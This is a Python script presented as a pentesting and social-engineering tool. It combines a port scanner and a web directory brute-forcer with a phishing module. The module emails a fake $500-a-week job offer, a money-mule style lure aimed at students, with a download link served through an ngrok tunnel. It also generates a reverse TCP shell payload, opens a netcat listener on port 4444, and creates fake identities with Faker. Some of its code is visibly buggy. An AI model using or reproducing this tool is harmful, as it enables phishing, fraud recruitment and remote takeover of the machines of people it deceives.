import argparse
import socket
import requests
import subprocess
import http.server
import socketserver
import os
from faker import Faker
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from RevTCPShellGen import RS
from pyngrok import ngrok

#Default port list
portlist = [80,443,21,22,110,995,143,993,25,26,587,3306,2082,2083,2086,2087,2095,2096,2077,2078]

#This dict is for default_scan
description = {
80 : "HTTP",
443 : "HTTPS",
21 : "FTP",
22 : "FTPS/SSH",
110 : "POP3",
995 : "POP3 SSL",
143 : "IMAP",
993 : "IMAP SSL",
25 : "SMTP",
26 : "SMTP",
587 : "SMTP SSL",
3306 : "MySQL",
2082 : "cPanel",
2083 : "cPanel SSL",
2086 : "WebHost Manager",
2087 : "WebHost Manager SSL",
2095 : "Webmail",
2096 : "Webmail SSL",
2077 : "WebDAV/WebDisk",
2078: "WebDAV/WebDisk SSL"
}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def directory_enum(URL):
    with open("directory-dic-medium.txt","r") as f:
        for dic in f:
            try:
                new_url = f"https://{URL}/{dic}"
                request = requests.get(new_url)
                if request == 200:
                    print(f"{bcolors.WARNING}Directory founded: {new_url}")
            except:
                new_url = f"http://{URL}/{dic}"
                request = requests.get(new_url)
                if request == 200:
                    print(f"{bcolors.WARNING}Directory founded: {new_url}")

def default_scan(host):
    try:
        name = socket.gethostname(host)
        IP = socket.gethostbyname()
        print("Host:" + name)
        print("IP Address:" + IP)
    except:
        IP = socket.gethostbyname(host)
        print("IP Address:" + IP)
    for port in portlist:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        # returns an error indicator
        result = s.connect_ex((host,port))
        if result == 0:
            print(bcolors.OKGREEN + """-----------------------------------
|Port|    |Status|
-----------------------------------
  {}       Open        """.format(port))
            print("Description: ",description[port])
        s.close()

def send_mail(url):
    port = 465  # For SSL
    email = input(bcolors.WARNING + "[*]Email: ")
    password = input(bcolors.WARNING + "[*]Password: ")
    target = input(bcolors.WARNING + "[*]Target Email: ")
    message = MIMEMultipart("alternative")
    message["Subject"] = "WORK AFTER CLASSES OFFER ($500 WEEKLY SALARY)"
    message["From"] = email
    message["To"] = target
    html = """\
    <html>
        <body>
            <p>Hello,<br>
            Are you currently in the US? Here is an opportunity for you to work part time after classes and earn $500 weekly.The job is completely done online and can be completed anytime in the evening/night at home and won't take much of your time daily, you don't have to be online all day and don't need any professional skill to do the job,all you need is just come online before going to bed to forward all order of the day made by agents to the supplier and you are done for the day.<br>
            </p>
        </body>
    </html>
    """
    html2 = f"<a href='{url}'> Click Here For Download Our App!</a>"
    part = MIMEText(html, "html")
    part2 = MIMEText(html2, "html")
    message.attach(part)
    message.attach(part2)
    # Create a secure SSL context
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(email, password)
        server.sendmail(email, target, message.as_string())

def ngrok_connection():
    url_http = ngrok.connect(bind_htttp=True).public_url
    ngrok_service = ngrok.get_ngrok_process()
    print("Ngrok URL:", url_http)
    send_mail(url_http)
    print(bcolors.OKCYAN + "[*]Sending Phishing Email...")
    try:
        ngrok_service.proc.wait()
    except KeyboardInterrupt:
        print(" ")
        ngrok.kill()

def phishing_atck():
    opt = 1
    while(opt != 0):
        opt = int(input(bcolors.OKCYAN + """1) Email Vector Attack
2) Create a Fake ID
0) Exit
CMD> """ + bcolors.ENDC))
        if opt == 1:
            h = socket.gethostname()
            ip = socket.gethostbyname(h)
            ip = f"'{ip}'"
            RS(ip)
            print(bcolors.OKCYAN + "[*]Generating a Payload...")
            # <NgrokTunnel: "http://<public_sub>.ngrok.io" -> "http://localhost:8000">
            os.chdir("netcat")
            retval = os.getcwd()
            os.system("start /wait cmd /c nc.exe -lvnp 4444")
        elif opt == 2:
            fake = Faker()
            print("Name: ", fake.name())
            print("Email: ", fake.email())
            print("Country: ", fake.country())
            print("Text: ", fake.text())

        
if __name__ == "__main__":
    print("""
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'
                                                                `XER0'""")
    print(bcolors.WARNING + "Pentesting and Social-Engineer Tool")
    print("Inspired by Mr.Robot (TV-Series)")
    print(bcolors.WARNING + """Warning: This tool is for educational and testing purposes,
    please use it with discretion. We are not responsible for any use against the law.""" + bcolors.ENDC)
    parser = argparse.ArgumentParser()
    parser.add_argument("-host", dest = "host", help = "Target Specification")
    parser.add_argument("-d", "--directory", help = "Web Directory Enumeration [Optional if the host have a HTTP/HTTPS port open]",action="store_true")
    parser.add_argument("-p", "--phishing", help = "Phishing Attack" , action="store_true")
    params = parser.parse_args()
    if params.host:
        default_scan(params.host)
    if params.directory:
        directory_enum(params.host)
    if params.phishing:
        phishing_atck()
